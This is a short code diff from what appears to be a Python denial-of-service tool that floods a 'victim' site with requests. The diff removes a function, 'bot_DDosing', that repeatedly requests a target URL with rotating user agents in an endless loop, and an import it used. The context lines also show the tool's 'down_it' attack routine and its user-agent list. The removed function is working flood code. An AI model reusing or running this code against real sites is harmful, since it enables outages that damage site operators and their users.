@@ -4,7 +4,6 @@ import socket
 import sys
 import threading
 import time
-import urllib.request
 from optparse import OptionParser
 from queue import Queue
 
@@ -34,16 +33,6 @@ def user_agent():
               "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"]
     # adding the compatible victim platforms to get the Spam request
     return uagent
-
-
-def bot_DDosing(url):
-    try:
-        while True:
-            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
-            print("\033[94mBot is DDosing...\033[0m")
-            time.sleep(.1)
-    except:
-        time.sleep(.1)
 
 
 def down_it():
